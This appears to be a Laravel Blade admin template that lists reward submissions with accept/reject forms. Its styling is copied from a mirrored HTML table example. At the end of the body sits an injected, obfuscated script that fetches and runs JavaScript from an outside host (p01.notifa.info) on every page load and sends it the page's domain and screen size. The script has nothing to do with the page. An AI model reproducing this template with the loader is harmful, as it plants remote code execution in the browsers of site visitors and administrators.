<!DOCTYPE html>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Admin Page</title>

<style type="text/css">
body, html  { height: 100%; }
html, body, div, span, applet, object, iframe,
/*h1, h2, h3, h4, h5, h6,*/ p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, font, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
b, u, i, center,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td {
	margin: 0;
	padding: 0;
	border: 0;
	outline: 0;
	font-size: 100%;
	vertical-align: baseline;
	background: transparent;
}
body { line-height: 1; }
ol, ul { list-style: none; }
blockquote, q { quotes: none; }
blockquote:before, blockquote:after, q:before, q:after { content: ''; content: none; }
:focus { outline: 0; }
del { text-decoration: line-through; }
table {border-spacing: 0; }
body{
	font-family:Arial, Helvetica, sans-serif;
	background: url(background.jpg);
	margin:0 auto;
	width:520px;
}
a:link {
	color: #666;
	font-weight: bold;
	text-decoration:none;
}
a:visited {
	color: #666;
	font-weight:bold;
	text-decoration:none;
}
a:active,
a:hover {
	color: #bd5a35;
	text-decoration:underline;
}

table a:link {
	color: #666;
	font-weight: bold;
	text-decoration:none;
}
table a:visited {
	color: #999999;
	font-weight:bold;
	text-decoration:none;
}
table a:active,
table a:hover {
	color: #bd5a35;
	text-decoration:underline;
}
table {
	font-family:Arial, Helvetica, sans-serif;
	color:#666;
	font-size:12px;
	text-shadow: 1px 1px 0px #fff;
	background:#eaebec;
	margin:20px;
	border:#ccc 1px solid;

	-moz-border-radius:3px;
	-webkit-border-radius:3px;
	border-radius:3px;

	-moz-box-shadow: 0 1px 2px #d1d1d1;
	-webkit-box-shadow: 0 1px 2px #d1d1d1;
	box-shadow: 0 1px 2px #d1d1d1;
}
table th {
	padding:21px 25px 22px 25px;
	border-top:1px solid #fafafa;
	border-bottom:1px solid #e0e0e0;

	background: #ededed;
	background: -webkit-gradient(linear, left top, left bottom, from(#ededed), to(#ebebeb));
	background: -moz-linear-gradient(top,  #ededed,  #ebebeb);
}
table th:first-child {
	text-align: left;
	padding-left:20px;
}
table tr:first-child th:first-child {
	-moz-border-radius-topleft:3px;
	-webkit-border-top-left-radius:3px;
	border-top-left-radius:3px;
}
table tr:first-child th:last-child {
	-moz-border-radius-topright:3px;
	-webkit-border-top-right-radius:3px;
	border-top-right-radius:3px;
}
table tr {
	text-align: center;
	padding-left:20px;
}
table td:first-child {
	text-align: left;
	padding-left:20px;
	border-left: 0;
}
table td {
	padding:18px;
	border-top: 1px solid #ffffff;
	border-bottom:1px solid #e0e0e0;
	border-left: 1px solid #e0e0e0;
	
	background: #fafafa;
	background: -webkit-gradient(linear, left top, left bottom, from(#fbfbfb), to(#fafafa));
	background: -moz-linear-gradient(top,  #fbfbfb,  #fafafa);
}
table tr.even td {
	background: #f6f6f6;
	background: -webkit-gradient(linear, left top, left bottom, from(#f8f8f8), to(#f6f6f6));
	background: -moz-linear-gradient(top,  #f8f8f8,  #f6f6f6);
}
table tr:last-child td {
	border-bottom:0;
}
table tr:last-child td:first-child {
	-moz-border-radius-bottomleft:3px;
	-webkit-border-bottom-left-radius:3px;
	border-bottom-left-radius:3px;
}
table tr:last-child td:last-child {
	-moz-border-radius-bottomright:3px;
	-webkit-border-bottom-right-radius:3px;
	border-bottom-right-radius:3px;
}
table tr:hover td {
	background: #f2f2f2;
	background: -webkit-gradient(linear, left top, left bottom, from(#f2f2f2), to(#f0f0f0));
	background: -moz-linear-gradient(top,  #f2f2f2,  #f0f0f0);	
}

</style>

</head>

<body>

<table cellspacing='0'> <!-- cellspacing='0' is important, must stay -->
    <form action="{{ route('admin.logout') }}" method="POST">
            {{ csrf_field() }}
            <button class="btn btn-sm btn-default btn-flat">Sign out</button>
        </form>
	<!-- Table Header -->
	<thead>
		<tr>
			<th>rewardment_id</th>
			<th>submission_id</th>
            <th>amount</th>
            <th>validated status</th>
            <th>action</th>
		</tr>
	</thead>
	<!-- Table Header -->

	<!-- Table Body -->
	<tbody>
        @foreach($rewardment as $reward)
		<tr>
            <td>{{$reward->rewardment_id}}</td>
            <td>{{$reward->submission_id}}</td>
            <td>{{$reward->amount}}</td>
            <td>{{$reward->validated}}</td>
            <td>
                <form method="POST" action="{{ route('reward.validation') }}">
                    {{ csrf_field() }}
                    <input type="hidden" name="reward_id" value={{$reward->rewardment_id}}>
                    <select id = "status" name="status">
                        <option value = 1>Accept</option>
                        <option value = 0>Reject</option>
                     </select>
                     <button>Go</button>
                </form>
            </td>
		</tr><!-- Table Row -->
        @endforeach
	</tbody>
	<!-- Table Body -->

</table>

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-12994732-3']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mOIBaPf6zvs5U3FcezwIdnwzS6Sa7vb2%2brQ%2fvMOR4CjJCgYqachO7JzWV9zf2wlkC1BxMmZizAz5bQcA%2bUOVJhhrbsegZCHEGPRDzel9eUmv4zXTzG5qdmQKgUe0GB1KeGwjrpMS2kr%2bOFejj1z%2fZ1e587uDWEH8kYWKbfaXWIybWH6gJOoDvSAHACkwwLXjOEmMWErF1Q8gJxlXl%2bFC0i2DuaU8gzQfeSHDB6X6WNkmueH4HrUd0R9%2fwdWkQcJQnnUAs8hDn%2bbMehc3RWocrcs9KosHimwPX1UzflF4yfs8MclCKh1ukzUSoEoze9plzF9dkxkuybW00gd%2b54%2foLyhuomlo7wBeIwGFe78QjC0gZZTNRj6zO9Z4dJrMTs9MW3Lj3623aP7%2fSVh07HUXxp9y3Kb5U43VcrhhA5%2bLRpDRDZ5jFh%2fICqdMSC18LXNsKFcdNgTbaZkgLiaIjXS5lpLI9X0xnVSa4qM%2bqt9L699o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from johnsardine.com/example/simple-little-table/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Sep 2018 00:54:20 GMT -->
</html>
